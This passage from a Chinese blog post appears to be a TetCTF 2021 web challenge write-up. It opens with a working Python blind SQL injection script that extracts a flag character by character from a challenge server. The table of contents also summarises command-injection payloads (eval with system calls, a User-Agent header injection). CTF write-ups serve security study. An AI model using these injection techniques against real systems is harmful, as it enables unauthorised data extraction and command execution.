+<h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is what it looks like unescaped: id=1!"1+strcmp(t_fl4g_v3lue_su,BINARY 0x # We'll add chars (in hex) after that.</span></span><br><span class="line">BASE_URL = <span class="string">'http://45.77.255.164/?id=1%26%261%2bstrcmp(t_fl4g_v3lue_su,BINARY%200x'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryUrl</span><span class="params">(param)</span>:</span></span><br><span class="line">    url = BASE_URL + param + <span class="string">')'</span></span><br><span class="line">    response = requests.post(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># all the rows we found have &lt;something&gt;_flag</span></span><br><span class="line">    <span class="comment"># the  underscore is important since there is an HTML comment that has "flag" (with no underscore)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'_flag'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">probeNextColChar</span><span class="params">(flagHex)</span>:</span></span><br><span class="line">    lowGuessIndex = <span class="number">32</span></span><br><span class="line">    highGuessIndex = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> lowGuessIndex &lt; highGuessIndex:</span><br><span class="line">        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // <span class="number">2</span></span><br><span class="line">        guessHex = hex(guessIndex)[<span class="number">2</span>:]</span><br><span class="line">        param = flagHex + guessHex</span><br><span class="line">        guess = chr(guessIndex)</span><br><span class="line">        <span class="keyword">if</span> tryUrl(param):</span><br><span class="line">            <span class="keyword">if</span> lowGuessIndex == guessIndex:</span><br><span class="line">                <span class="keyword">return</span> guess</span><br><span class="line">            lowGuessIndex = guessIndex</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            highGuessIndex = guessIndex</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flagHex = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nextChar = probeNextColChar(flagHex)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nextChar:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += nextChar</span><br><span class="line">    print(<span class="string">"flag so far:"</span>, flag)</span><br><span class="line">    flagHex += hex(ord(nextChar))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h4><h6 id="https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-HPNY-md"><a href="#https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-HPNY-md" class="headerlink" title="https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/HPNY.md"></a><a href="https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/HPNY.md" target="_blank" rel="noopener">https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/HPNY.md</a></h6><h6 id="https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-Super-20Calc-md"><a href="#https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-Super-20Calc-md" class="headerlink" title="https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/Super%20Calc.md"></a><a href="https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/Super%20Calc.md" target="_blank" rel="noopener">https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/Super%20Calc.md</a></h6><h6 id="https-www-cnblogs-com-v01cano-p-11736722-html"><a href="#https-www-cnblogs-com-v01cano-p-11736722-html" class="headerlink" title="https://www.cnblogs.com/v01cano/p/11736722.html"></a><a href="https://www.cnblogs.com/v01cano/p/11736722.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/11736722.html</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/14/Python-urllib-HTTP头注入漏洞/" rel="next" title="Python urllib HTTP头注入漏洞">
+                <i class="fa fa-chevron-left"></i> Python urllib HTTP头注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-Super-Calc"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Super Calc</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#打开题目链接-http-139-180-155-171-calc-1-2-0-2-5-1-如下所示："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">打开题目链接 http://139.180.155.171/?calc=(1.2-0.2)*5.1 如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是当我们输入shell命令时，给我们返回了下列信息。"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">但是当我们输入shell命令时，给我们返回了下列信息。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#分析了一下源代码，发现了一处关键点："><span class="nav-number">1.1.0.5.</span> <span class="nav-text">分析了一下源代码，发现了一处关键点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们想要执行shell命令，我们必须绕过if语句中的判断，正则表达式给出我们可以使用的字符0123456789-amp-，并且长度不能超过70，我们可以用这些可用字符通过xor构造一个类似-http-139-180-155-171-calc-eval-GET-1-amp-1-system-ls-这样一个payload就可以执行shell命令了。"><span class="nav-number">1.1.0.6.</span> <span class="nav-text">我们想要执行shell命令，我们必须绕过if语句中的判断，正则表达式给出我们可以使用的字符0123456789+-*/().~^|&amp;，并且长度不能超过70，我们可以用这些可用字符通过xor构造一个类似 http://139.180.155.171/?calc=eval($_GET[1])&amp;1=system(ls) 这样一个payload就可以执行shell命令了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload如下："><span class="nav-number">1.1.0.7.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用payload列出当前目录："><span class="nav-number">1.1.0.8.</span> <span class="nav-text">使用payload列出当前目录：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#读取flag文件："><span class="nav-number">1.1.0.9.</span> <span class="nav-text">读取flag文件：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-HPNY"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 HPNY</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#打开题目链接-http-139-180-155-171-8003-如下："><span class="nav-number">1.2.0.1.</span> <span class="nav-text">打开题目链接 http://139.180.155.171:8003/ 如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#跟上一题相反，这个可以使用a-z-等字符，因此我们不用构造无字符的shell直接执行shell命令即可。"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">跟上一题相反，这个可以使用a-z\(\)\_\.等字符，因此我们不用构造无字符的shell直接执行shell命令即可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法一："><span class="nav-number">1.2.0.3.</span> <span class="nav-text">方法一：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法二："><span class="nav-number">1.2.0.4.</span> <span class="nav-text">方法二：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先用getallheaders-读取http标头，读取后是一个数组，然后用implode-将数组处理成字符串在拼接道eval-中执行shell命令。"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">首先用getallheaders()读取http标头，读取后是一个数组，然后用implode()将数组处理成字符串在拼接道eval()中执行shell命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法二有四个值得注意的地方，一是xyz-test，二是我们在User-Agent-eval-system-39-cat-fl4g-here-but-can-you-get-it-hohoho-php-39-，三是abc-test-，四是Accept中webp-的后面-为什么我们要这么做呢？"><span class="nav-number">1.2.0.6.</span> <span class="nav-text">方法二有四个值得注意的地方，一是xyz: /*test，二是我们在User-Agent: */ eval(system(&#39;cat fl4g_here_but_can_you_get_it_hohoho.php&#39;));/*，三是abc: test*/，四是Accept中webp,的后面/为什么我们要这么做呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#xyz-test-User-Agent中的第一个-最后一个-和abc-test-是为了注释eval-中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是image-webp-q-0-8这样会破坏-的注释，因此我们将其删除和者添加成image-webp-q-0-8即可。"><span class="nav-number">1.2.0.7.</span> <span class="nav-text">xyz: /*test,User-Agent中的第一个*/,最后一个/*和abc: test*/是为了注释eval()中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是image/webp,*/*;q=0.8这样会破坏/**/的注释，因此我们将其删除和者添加成image/webp,*//*;q=0.8即可。</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-mysqlimit"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 mysqlimit</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#源代码："><span class="nav-number">1.3.0.1.</span> <span class="nav-text">源代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">payload:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-参考链接"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-HPNY-md"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/HPNY.md</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-hrca-writeups-CTF-Writeups-blob-master-2021-TetCTF-202021-Super-20Calc-md"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">https://github.com/hrca-writeups/CTF-Writeups/blob/master/2021/TetCTF%202021/Super%20Calc.md</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-cnblogs-com-v01cano-p-11736722-html"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">https://www.cnblogs.com/v01cano/p/11736722.html</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">178k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
